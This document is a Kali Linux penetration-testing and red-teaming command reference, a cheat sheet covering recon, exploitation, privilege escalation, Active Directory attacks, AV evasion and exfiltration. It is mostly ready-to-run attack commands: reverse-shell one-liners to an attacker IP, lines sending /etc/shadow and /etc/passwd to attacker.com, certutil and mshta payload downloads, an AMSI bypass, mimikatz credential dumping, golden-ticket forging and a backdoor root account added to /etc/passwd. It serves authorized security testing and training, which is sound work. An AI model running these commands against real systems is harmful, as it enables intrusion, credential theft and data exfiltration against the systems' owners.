# Kali Linux — Professional Penetration Testing & Red Teaming Command Reference

> **Legal reminder:** Only use these techniques on systems you own or have **explicit written authorization** to test. Unauthorized access is a criminal offence in every jurisdiction.

---

## Table of Contents
1. [Reconnaissance & OSINT](#1-reconnaissance--osint)
2. [Network Scanning & Enumeration](#2-network-scanning--enumeration)
3. [Vulnerability Scanning](#3-vulnerability-scanning)
4. [Web Application Testing](#4-web-application-testing)
5. [Exploitation](#5-exploitation)
6. [Post-Exploitation](#6-post-exploitation)
7. [Privilege Escalation](#7-privilege-escalation)
8. [Lateral Movement & Pivoting](#8-lateral-movement--pivoting)
9. [Password Attacks](#9-password-attacks)
10. [Wireless Attacks](#10-wireless-attacks)
11. [Active Directory Attacks](#11-active-directory-attacks)
12. [Evasion & AV Bypass](#12-evasion--av-bypass)
13. [Tunneling & Exfiltration](#13-tunneling--exfiltration)
14. [Reporting & Evidence Collection](#14-reporting--evidence-collection)

---

## 1. Reconnaissance & OSINT

### Passive Recon (no direct contact with target)
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
dig axfr @ns1.target.com target.com        # Zone transfer attempt
dnsrecon -d target.com -t axfr
dnsenum target.com

# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
amass enum -d target.com
assetfinder --subs-only target.com
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://FUZZ.target.com -H "Host: FUZZ.target.com"

# Google dorks (manual browser search)
# site:target.com filetype:pdf
# site:target.com inurl:admin
# site:target.com intitle:"index of"
# "target.com" ext:sql OR ext:bak OR ext:env

# Certificate transparency (find subdomains)
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

# Email harvesting
theHarvester -d target.com -b all -l 500

# Shodan CLI (requires API key)
shodan search "hostname:target.com"
shodan host 1.2.3.4

# Wayback Machine recon
waybackurls target.com | tee wayback_urls.txt
gau target.com | tee gau_urls.txt

# GitHub recon
# Search manually: org:targetcompany password OR secret OR api_key

# Metadata extraction from public files
exiftool document.pdf
metagoofil -d target.com -t pdf,doc,xls -l 20 -o metadata/
```

### Active Recon (direct contact)
```bash
# Traceroute
traceroute target.com
traceroute -T -p 80 target.com           # TCP traceroute on port 80

# Reverse DNS
host 1.2.3.4
nslookup 1.2.3.4

# Banner grabbing
nc -nv 1.2.3.4 80
curl -I http://target.com
telnet target.com 25
```

---

## 2. Network Scanning & Enumeration

### Nmap — Core Scanning
```bash
# Host discovery (ping sweep)
nmap -sn 192.168.1.0/24
nmap -sn -PE -PP -PS80,443 -PA3389 192.168.1.0/24

# Full TCP port scan
nmap -p- -T4 192.168.1.10
nmap -p- --min-rate 5000 192.168.1.10    # Faster

# Service & version detection
nmap -sV -p- 192.168.1.10
nmap -sV --version-intensity 9 192.168.1.10

# OS detection (requires root)
nmap -O 192.168.1.10
nmap -A 192.168.1.10                     # Aggressive: OS + version + scripts + traceroute

# Stealth SYN scan (default as root)
nmap -sS -p 22,80,443,8080 192.168.1.10

# UDP scan (slow, but finds DNS, SNMP, etc.)
nmap -sU --top-ports 200 192.168.1.10

# NSE script scanning
nmap --script vuln 192.168.1.10
nmap --script smb-vuln-ms17-010 192.168.1.10   # EternalBlue check
nmap --script http-enum 192.168.1.10
nmap --script ssl-heartbleed 192.168.1.10
nmap --script=default,safe 192.168.1.10

# Output formats
nmap -sV -oN output.txt 192.168.1.10     # Normal
nmap -sV -oX output.xml 192.168.1.10     # XML (for import)
nmap -sV -oG output.gnmap 192.168.1.10   # Grepable
nmap -sV -oA output 192.168.1.10         # All formats

# Firewall evasion techniques
nmap -f 192.168.1.10                     # Fragment packets
nmap -D RND:10 192.168.1.10              # Decoy scan
nmap --source-port 53 192.168.1.10       # Spoof source port
nmap -sI zombie_ip 192.168.1.10          # Idle/zombie scan
```

### Service-Specific Enumeration
```bash
# SMB (port 445)
smbclient -L //192.168.1.10 -N            # List shares anonymously
smbclient //192.168.1.10/share -N
enum4linux -a 192.168.1.10
enum4linux-ng -A 192.168.1.10
crackmapexec smb 192.168.1.0/24           # SMB sweep
crackmapexec smb 192.168.1.10 -u '' -p '' --shares

# SNMP (port 161 UDP)
snmpwalk -v2c -c public 192.168.1.10
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.10

# LDAP (port 389)
ldapsearch -x -H ldap://192.168.1.10 -b "dc=target,dc=com"
nmap --script ldap-search 192.168.1.10

# FTP (port 21)
ftp 192.168.1.10                          # Try anonymous login
nmap --script ftp-anon 192.168.1.10

# SSH (port 22)
ssh-audit 192.168.1.10                    # Check SSH config weaknesses
nmap --script ssh-auth-methods 192.168.1.10

# RDP (port 3389)
nmap --script rdp-enum-encryption 192.168.1.10
xfreerdp /v:192.168.1.10 /u:user /p:pass

# MySQL (port 3306)
mysql -h 192.168.1.10 -u root -p
nmap --script mysql-info,mysql-databases 192.168.1.10

# MSSQL (port 1433)
impacket-mssqlclient user:pass@192.168.1.10
nmap --script ms-sql-info 192.168.1.10
```

---

## 3. Vulnerability Scanning

```bash
# Nessus (GUI-based, industry standard — install separately)
# Run via browser at https://localhost:8834

# OpenVAS / GVM
gvm-start
# Access at https://127.0.0.1:9392

# Nikto (web server scanner)
nikto -h http://192.168.1.10
nikto -h http://192.168.1.10 -ssl -port 443
nikto -h http://192.168.1.10 -Tuning 9    # SQL injection checks

# Nuclei (fast template-based scanner)
nuclei -u https://target.com
nuclei -u https://target.com -t cves/
nuclei -l urls.txt -t vulnerabilities/ -o results.txt

# Searchsploit (local Exploit-DB search)
searchsploit apache 2.4
searchsploit --id openssh 7.4
searchsploit -m 44533                      # Copy exploit to current dir
```

---

## 4. Web Application Testing

### Directory & File Discovery
```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x php,html,txt,bak -t 50
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Feroxbuster (recursive, faster)
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# FFUF (flexible fuzzer)
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404 -t 100
ffuf -u http://target.com/page?param=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
```

### Burp Suite (essential web proxy)
```bash
# Launch Burp
burpsuite &

# Key Burp modules:
# Proxy     — intercept & modify HTTP traffic
# Repeater  — manually craft & replay requests
# Intruder  — brute force / fuzzing (slow in Community)
# Scanner   — automated vuln scan (Pro only)
# Decoder   — encode/decode Base64, URL, HTML etc.

# Set browser proxy: 127.0.0.1:8080
# Install Burp CA cert in browser for HTTPS interception
```

### SQL Injection
```bash
# Manual detection (in browser or Burp)
# Add ' to parameter — look for DB errors
# Try: ' OR '1'='1
# Try: ' OR '1'='1'--

# SQLmap (automated)
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/page?id=1" --os-shell       # If writable webroot
sqlmap -r request.txt --level 5 --risk 3                  # Use saved Burp request
sqlmap -u "http://target.com" --forms --crawl=2 --batch
```

### XSS, LFI, SSRF, XXE
```bash
# XSS payloads (test in parameters, headers, search fields)
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# "><svg onload=alert(1)>

# LFI (Local File Inclusion)
# http://target.com/page?file=../../../../etc/passwd
# http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt \
      --hc 404 "http://target.com/page?file=FUZZ"

# SSRF
# http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
# http://target.com/fetch?url=http://127.0.0.1:22

# Command injection
# ; id
# | id
# && id
# `id`
# $(id)
```

---

## 5. Exploitation

### Metasploit Framework
```bash
# Start Metasploit
msfconsole
msfdb init && msfconsole                  # With database

# Basic workflow
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
info
show options
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Common commands
show exploits
show payloads
show auxiliary
search type:exploit platform:windows smb
use auxiliary/scanner/smb/smb_ms17_010   # Check for EternalBlue without exploiting
db_nmap -sV 192.168.1.0/24               # Nmap with results in MSF DB
hosts                                     # List discovered hosts
services                                  # List discovered services
vulns                                     # List found vulnerabilities
```

### Manual Exploitation
```bash
# Compile and run an exploit from Exploit-DB
searchsploit -m 44533
gcc 44533.c -o exploit
./exploit

# Python exploit adjustment
python3 exploit.py 192.168.1.10 443

# Using impacket suite
impacket-psexec administrator:password@192.168.1.10
impacket-wmiexec administrator:password@192.168.1.10
impacket-smbexec administrator:password@192.168.1.10
```

### Reverse Shells
```bash
# Generate payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=443 -f exe -e x64/shikata_ga_nai -o shell_enc.exe

# Netcat listeners
nc -lvnp 4444                             # Listen for incoming shell
rlwrap nc -lvnp 4444                      # With readline (arrow keys work)

# One-liner reverse shells (run on target)
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
php -r '$sock=fsockopen("192.168.1.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Upgrade shell to fully interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → reset
export TERM=xterm
stty rows 38 columns 116
```

---

## 6. Post-Exploitation

### Meterpreter Commands
```bash
# System info
sysinfo
getuid
getpid
ps                                        # List processes
migrate <PID>                             # Migrate to another process

# File operations
ls
cd C:\\Users
download C:\\Users\\user\\secret.txt
upload /tmp/tool.exe C:\\Windows\\Temp\\tool.exe
search -f *.txt -d C:\\Users

# Network
ipconfig
arp
route
portfwd add -l 3306 -p 3306 -r 192.168.2.10   # Port forward

# Privilege escalation
getsystem                                 # Attempt auto privesc
getprivs

# Persistence
run persistence -h
run post/windows/manage/persistence_exe STARTUP=SCHEDULER

# Pivoting
run post/multi/manage/autoroute SUBNET=192.168.2.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
# Edit /etc/proxychains4.conf: socks5 127.0.0.1 1080
```

### Linux Post-Exploitation
```bash
# System enumeration
uname -a
cat /etc/os-release
hostname
id; whoami
cat /etc/passwd
cat /etc/shadow                           # Requires root
cat /etc/sudoers
env
history

# Network enumeration
ip a
ip route
ss -tulnp
netstat -tulnp
cat /etc/hosts
arp -a

# Find interesting files
find / -name "*.conf" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -perm -4000 2>/dev/null            # SUID binaries
find / -writable -type f 2>/dev/null | grep -v proc

# Automated enumeration scripts
curl https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && bash LinEnum.sh
```

### Windows Post-Exploitation
```bash
# CMD enumeration
whoami /all
systeminfo
net user
net localgroup administrators
ipconfig /all
netstat -ano
tasklist /svc
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# PowerShell enumeration
Get-LocalUser
Get-LocalGroupMember Administrators
Get-Process
Get-NetTCPConnection
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}

# WinPEAS (automated privesc enumeration)
.\winPEAS.exe

# Mimikatz (credential dumping — requires admin/SYSTEM)
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
sekurlsa::pth /user:admin /ntlm:HASH /domain:. /run:cmd.exe
```

---

## 7. Privilege Escalation

### Linux Privilege Escalation
```bash
# Sudo abuse
sudo -l                                   # What can you run as root?
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
# Check GTFOBins: https://gtfobins.github.io

# SUID exploitation
find / -perm -u=s -type f 2>/dev/null
/usr/bin/find . -exec /bin/sh -p \; -quit  # If find is SUID

# Cron job exploitation
cat /etc/crontab
ls -la /etc/cron*
# Find writable scripts run by root cron

# Kernel exploits
uname -r
searchsploit linux kernel 4.15
# DirtyCow: CVE-2016-5195

# Writable /etc/passwd
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
su hacker   # password: hacker

# Path hijacking
echo $PATH
# If . is in PATH or a writable dir is before /usr/bin:
echo '/bin/bash' > /tmp/ls && chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

### Windows Privilege Escalation
```bash
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
accesschk.exe -uwcqv "Everyone" *
sc config VulnService binpath= "C:\shell.exe"
sc start VulnService

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i C:\shell.msi

# Token impersonation (if SeImpersonatePrivilege)
.\PrintSpoofer.exe -i -c cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\JuicyPotatoNG.exe -t * -p "C:\shell.exe"
```

---

## 8. Lateral Movement & Pivoting

```bash
# SSH tunneling
ssh -L 3306:192.168.2.10:3306 user@pivot_host     # Local forward
ssh -R 4444:localhost:4444 user@attacker_ip        # Remote forward
ssh -D 1080 user@pivot_host                        # Dynamic SOCKS proxy

# Proxychains
# Edit /etc/proxychains4.conf → add: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 192.168.2.0/24
proxychains crackmapexec smb 192.168.2.10

# Chisel (TCP/UDP tunneling over HTTP)
# Attacker:
./chisel server -p 8080 --reverse
# Target (pivot host):
./chisel client ATTACKER_IP:8080 R:socks
# Then use proxychains with socks5 127.0.0.1 1080

# Pass-the-Hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH --local-auth

# Pass-the-Ticket
impacket-getTGT domain/user:password
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain/user@target
```

---

## 9. Password Attacks

### Online Brute Force
```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "//login.php:user=^USER^&pass=^PASS^:Invalid"
hydra -l admin -P wordlist.txt ftp://192.168.1.10
hydra -L users.txt -P wordlist.txt rdp://192.168.1.10

# Medusa
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh

# CrackMapExec
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt
crackmapexec smb 192.168.1.10 -u administrator -p password123
```

### Offline Hash Cracking
```bash
# Identify hash type
hash-identifier
hashid hash.txt

# Hashcat
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt         # MD5
hashcat -m 1000 hashes.txt rockyou.txt                            # NTLM
hashcat -m 1800 hashes.txt rockyou.txt                            # SHA-512crypt (Linux shadow)
hashcat -m 13100 hashes.txt rockyou.txt                           # Kerberoast
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule  # With rules
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?d?d?d                      # Mask attack

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt --wordlist=rockyou.txt
john --show hashes.txt
zip2john protected.zip > zip.hash && john zip.hash
```

---

## 10. Wireless Attacks

```bash
# Set adapter to monitor mode
airmon-ng start wlan0
iwconfig                                   # Confirm wlan0mon

# Capture handshakes
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack (force clients to reconnect = capture handshake)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
hashcat -m 22000 capture.hc22000 rockyou.txt              # Convert first with hcxtools

# Evil Twin / Rogue AP
hostapd-wpe hostapd-wpe.conf                              # Capture enterprise creds
airbase-ng -e "FreeWifi" -c 6 wlan0mon

# WPS attacks
wash -i wlan0mon                           # Find WPS-enabled APs
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
bully -b AA:BB:CC:DD:EE:FF wlan0mon
```

---

## 11. Active Directory Attacks

```bash
# Enumeration
bloodhound-python -d domain.local -u user -p pass -ns 192.168.1.10 -c all
# Import JSON files into BloodHound GUI for attack path analysis

impacket-GetADUsers -all domain.local/user:pass
ldapdomaindump 192.168.1.10 -u 'domain\user' -p pass

# Kerberoasting (get service account hashes)
impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.10 -request
# Crack with: hashcat -m 13100 hashes.txt rockyou.txt

# AS-REP Roasting (no pre-auth required accounts)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10
# Crack with: hashcat -m 18200 hashes.txt rockyou.txt

# Pass-the-Hash / Pass-the-Ticket
impacket-psexec domain/admin@192.168.1.10 -hashes :NTLM_HASH
impacket-secretsdump domain/admin:pass@192.168.1.10    # Dump all hashes

# DCSync attack (if you have domain replication rights)
impacket-secretsdump -just-dc domain/admin:pass@DC_IP
mimikatz: lsadump::dcsync /user:krbtgt

# Golden Ticket attack
mimikatz: kerberos::golden /user:Administrator /domain:domain.local \
          /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket
mimikatz: kerberos::golden /user:user /domain:domain.local \
          /sid:S-1-5-21-... /target:server.domain.local \
          /service:cifs /rc4:SERVICE_HASH /ptt

# Zerologon (CVE-2020-1472)
python3 zerologon_tester.py DC_NETBIOS_NAME DC_IP
```

---

## 12. Evasion & AV Bypass

```bash
# Encode payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 \
         -e x64/xor_dynamic -i 5 -f exe -o shell.exe

# Veil Framework (AV evasion)
veil
use Evasion
list
use go/meterpreter/rev_tcp.py
set LHOST 192.168.1.5
generate

# Shellter (inject into legitimate PE)
shellter

# AMSI bypass (PowerShell — run first)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# PowerShell execution policy bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -enc BASE64_ENCODED_COMMAND

# Obfuscated PowerShell
Invoke-Obfuscation                        # Tool for obfuscating PS commands

# Living off the Land (LOLBins)
certutil -urlcache -split -f http://IP/shell.exe shell.exe
bitsadmin /transfer myJob http://IP/shell.exe C:\Temp\shell.exe
regsvr32 /s /n /u /i:http://IP/file.sct scrobj.dll
mshta http://IP/payload.hta
```

---

## 13. Tunneling & Exfiltration

```bash
# DNS tunneling
iodine -f -P password dns.attacker.com     # Tunnel IP over DNS
dnscat2 --dns domain=attacker.com          # C2 over DNS

# ICMP tunneling
ptunnel-ng -p attacker.com -lp 8080 -da target.com -dp 22   # SSH over ICMP

# HTTP tunneling
stunnel                                    # SSL wrapper
reGeorg (webshell-based SOCKS tunnel)

# Data exfiltration
# Base64 encode and exfiltrate via DNS
cat /etc/shadow | base64 | while read line; do host $line.attacker.com; done

# Exfil via HTTP POST
curl -X POST http://attacker.com/receive -d @/etc/passwd

# Netcat file transfer
# Receiver:  nc -lvnp 4444 > received_file
# Sender:    nc 192.168.1.5 4444 < file_to_send

# SCP (if SSH available)
scp -i id_rsa user@192.168.1.10:/etc/shadow ./shadow
```

---

## 14. Reporting & Evidence Collection

```bash
# Screenshot tools
scrot -d 5 screenshot.png                  # Linux
import -window root screenshot.png         # ImageMagick

# Terminal session logging
script -a pentest_session.log              # Log everything
tmux new-session -s pentest                # Use tmux for organized sessions

# Network capture
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 port 80 -w http.pcap

# Metasploit DB export
db_export -f xml /tmp/report.xml

# Screenshot within Meterpreter
screenshot
```

---

## Quick Reference — Wordlists

| Wordlist | Path | Best For |
|----------|------|----------|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | Password cracking |
| dirb common | `/usr/share/wordlists/dirb/common.txt` | Web directory brute force |
| SecLists | `/usr/share/seclists/` | Everything (install: `apt install seclists`) |
| dirbuster medium | `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Web directories |

---

## Quick Reference — Ports Cheatsheet

| Port | Protocol | Service | Notes |
|------|----------|---------|-------|
| 21 | TCP | FTP | Try anonymous login |
| 22 | TCP | SSH | Brute force, key reuse |
| 23 | TCP | Telnet | Cleartext creds |
| 25 | TCP | SMTP | Email enumeration |
| 53 | UDP/TCP | DNS | Zone transfer, tunneling |
| 80/443 | TCP | HTTP/HTTPS | Web app attacks |
| 110 | TCP | POP3 | Email creds |
| 139/445 | TCP | SMB | EternalBlue, relay attacks |
| 389 | TCP | LDAP | AD enumeration |
| 1433 | TCP | MSSQL | DB access, xp_cmdshell |
| 3306 | TCP | MySQL | DB access |
| 3389 | TCP | RDP | Brute force, BlueKeep |
| 5985 | TCP | WinRM | Evil-WinRM shell |
| 6379 | TCP | Redis | Unauthenticated access |
| 8080/8443 | TCP | Alt HTTP | Admin panels, dev servers |

---

## Tools Installation

```bash
# Update Kali
apt update && apt upgrade -y

# Essential tools
apt install -y nmap metasploit-framework burpsuite gobuster feroxbuster \
               john hashcat hydra crackmapexec impacket-scripts bloodhound \
               neo4j seclists nuclei subfinder amass chisel rlwrap

# Python tools
pip3 install bloodhound impacket

# Go tools
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/lc/gau/v2/cmd/gau@latest
```

---

*This guide covers professional-level techniques. Always operate within legal boundaries with proper written authorization. Unauthorized use of these techniques is illegal.*
